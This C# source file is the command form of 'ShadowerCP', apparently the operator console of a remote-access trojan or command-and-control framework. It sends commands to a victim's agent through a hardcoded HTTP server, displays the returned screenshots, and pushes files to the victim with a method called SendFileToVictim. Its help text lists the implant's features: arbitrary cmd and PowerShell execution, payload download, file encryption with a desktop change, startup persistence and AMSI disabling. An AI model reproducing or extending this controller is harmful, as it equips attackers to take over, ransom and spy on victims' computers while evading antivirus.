using ShadowerCP.Misc;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace ShadowerCP
{
    public partial class CommandForm : Form
    {
        public string AgentID { get; set; }
        private string strSelectedFileToUpload;
        public CommandForm(string strAgentIdentifier)
        {
            InitializeComponent();
            AgentID = strAgentIdentifier;
        }

        string strBaseURL = @"http://192.168.1.92:8080/agenthandler/";


        private commandresult GetCommandResult()
        {
            string strGetCommandResURL = strBaseURL + AgentID;
            commandresult ocommandresult = new commandresult();

            using (var shadowerWebClient = new WebClient())
            {

                shadowerWebClient.Headers.Add("Content-Type:application/json");

                var jsonRes = shadowerWebClient.DownloadString(strGetCommandResURL);
                ocommandresult = new JavaScriptSerializer().Deserialize<commandresult>(jsonRes);
            }
            return ocommandresult;
        }

        private string SendCommandToAgent(string strCommandToAgent)
        {
            string strSendCommandResURL = strBaseURL + "SendCommandToAgent";
            string strRetAgentID = string.Empty;
            command ocommand = new command();

            using (var shadowerWebClient = new WebClient())
            {

                shadowerWebClient.Headers.Add("Content-Type:application/json");
                ocommand.commandfromc2 = strCommandToAgent;
                ocommand.agentuniqid = AgentID;
                ocommand.pubkey = "already in db";
                string retAgentID = shadowerWebClient.UploadString(strSendCommandResURL, "PUT",new JavaScriptSerializer().Serialize(ocommand));
                
            }
            return strRetAgentID;
        }

        private string SendFileToVictim(string strFileContent)
        {
            string strSendCommandResURL = strBaseURL + "SendCommandToAgent";
            string strRetAgentID = string.Empty;
            command ocommand = new command();

            using (var shadowerWebClient = new WebClient())
            {

                shadowerWebClient.Headers.Add("Content-Type:application/json");
                ocommand.commandfromc2 = "upload" +  " " + strFileContent + " " + Path.GetFileName(strSelectedFileToUpload);
                ocommand.agentuniqid = AgentID;
                string retAgentID = shadowerWebClient.UploadString(strSendCommandResURL, "PUT", new JavaScriptSerializer().Serialize(ocommand));

            }
            return strRetAgentID;
        }

        private void btnSendandReceive_Click(object sender, EventArgs e)
        {
            if(txtCommand.Text.Trim().ToLower() == "help")
            {
                StringBuilder strbHelp = new StringBuilder();
                strbHelp.AppendLine("\tcmd yourcommand");
                strbHelp.AppendLine("\tps yourcommand");
                strbHelp.AppendLine("\tgetscreen <screen_number>");
                strbHelp.AppendLine("\tscreencount");
                strbHelp.AppendLine("\tdownload http(s)://URL");
                strbHelp.AppendLine("\tupload <fullfilepath>");
                strbHelp.AppendLine("\tenc <filepath>,*.*,changeDeskTop");
                strbHelp.AppendLine("\tlistdir");
                strbHelp.AppendLine("\tlistfiles");
                strbHelp.AppendLine("\tsetstartup");
                strbHelp.AppendLine("\tamsidisable");
                rtResult.Text= strbHelp.ToString();
                return;
            }

            SendCommandToAgent(txtCommand.Text.Trim());
            System.Threading.Thread.Sleep(3000);
            string strCmdResult =  GetCommandResult().cmdtxtresult;
            if (txtCommand.Text.Trim().ToLower().StartsWith("getscreen"))
            {
                picScreen.Visible = true;                
                rtResult.Visible = false;
                MemoryStream msScreen = new MemoryStream(Convert.FromBase64String(strCmdResult));
                var imgScreen = Image.FromStream(msScreen);
                picScreen.BackgroundImage = imgScreen;                
                
            }else
            {
                picScreen.Visible = false;
                rtResult.Visible = true;
                rtResult.Text = strCmdResult;
            }

        }


        private string GetSelectedFilePath(OpenFileDialog opnDialogue)
        {
            
            if (opnDialogue.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    strSelectedFileToUpload = opnDialogue.FileName;

                }
                catch (Exception ex)
                {
                    MessageBox.Show(" Error message: {ex.Message}\n\n" + $"Details:\n\n{ex.StackTrace}");
                }

            }
            return strSelectedFileToUpload;
        }

        private string ConvertFileToB64(string strFilepath)
        {
            byte[] baFileContent = File.ReadAllBytes(strFilepath);
            return Convert.ToBase64String(baFileContent);
        }

        private void btnUpload_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileToUpload;
            openFileToUpload = new OpenFileDialog()
            {
                FileName = "Select your file to Upload",
                Filter = "All files (*.*)|*.*",
                Title = "Open a File "
            };
            if (openFileToUpload.ShowDialog() == DialogResult.OK)
            {
                SendFileToVictim(ConvertFileToB64(GetSelectedFilePath(openFileToUpload)));
            }
        }

        private void btnControllerPanel_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void btnIsAdmin_Click(object sender, EventArgs e)
        {
            SendCommandToAgent("isadmin");
            System.Threading.Thread.Sleep(3000);
            rtResult.Text = GetCommandResult().cmdtxtresult;
        }
    }
}
